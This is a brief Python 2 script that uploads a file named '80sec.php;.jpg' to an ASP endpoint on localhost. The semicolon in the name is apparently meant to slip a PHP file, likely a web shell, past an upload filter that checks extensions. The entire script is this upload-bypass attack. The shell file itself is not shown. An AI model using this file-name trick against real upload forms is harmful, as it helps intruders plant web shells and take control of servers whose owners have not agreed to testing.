#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import urllib2
import httplib
import cookielib
import requests



################################################
if __name__=='__main__':
    data="http://127.0.0.1/1.asp?fk"
    files = {'fk': open('80sec.php;.jpg', 'rb')}
    r = requests.post(data, files=files)
    data=r.text

